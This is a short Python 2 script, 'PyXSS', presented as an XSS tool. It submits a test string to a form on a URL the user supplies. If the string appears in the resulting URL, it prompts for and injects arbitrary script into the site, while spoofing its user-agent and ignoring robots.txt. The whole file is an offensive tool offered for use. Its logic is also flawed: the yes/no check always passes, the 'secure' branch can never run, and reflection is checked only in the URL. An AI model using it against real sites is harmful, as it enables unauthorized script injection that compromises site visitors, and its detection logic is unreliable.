#PyXSS - XSS Tool Written In Python2
import os, time, argparse
try:
  import mechanize
except:
  print("Mechanize Not Installed! Run setup.py to install it!")
  quit()
def banner():
  print('''

   __ ____  ___  _________ _________     /\  __   
  / / \   \/  / /   _____//   _____/    / /  \ \  
 / /   \     /  \_____  \ \_____  \    / /    \ \ 
 \ \   /     \  /        \/        \  / /     / / 
  \_\ /___/\  \/_______  /_______  / / /     /_/  
            \_/        \/        \/  \/           
                                                  
''')                                
def args():
  global args
  parser = argparse.ArgumentParser()
  parser.add_argument('-u', '--url', help="URL To Scan")
  parser.add_argument('-f', '--form', help="Input Form's Name")
  args = parser.parse_args()
def test():
  global br
  br = mechanize.Browser() 
  br.addheaders = [
    ('User-agent',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')
] 
  br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
  br.set_handle_robots(False)
  br.set_handle_equiv(True)
  text = "TESTING_FOR_XSS"
  br.open(str(args.url))
  br.select_form(nr=0)
  br.form[str(args.form)] = text
  r = br.submit()
  if (text in r.geturl()):
    print "XSS Vulnerability Found!"
    print "Would You Like To Inject a Script In the Site?"
    yorn = raw_input("Y/N: ")
    if yorn == 'Y' or 'y':
      br.open('http://www.google.com')
      code = raw_input("Enter Code: ")
      br.open(str(args.url))
      br.select_form(nr=0)
      br.form[str(args.form)] = code
      r = None
      r = br.submit()
      print "Injected code: " + code + "\nURL: " + str(r.geturl())
      print "[NOTE]: This Technique doesn't always work\nsome websites filter some characters."
      print "\nThanks for using PyXSS."
      quit() 
    if (text not in r.geturl()):
      print "XSS Tested, Website is secure."
      quit()
    if yorn == 'N' or 'n':
      print "Quitting tool..."
      time.sleep(3)
      quit()
def main():
  banner()
  args()
  test()
main()
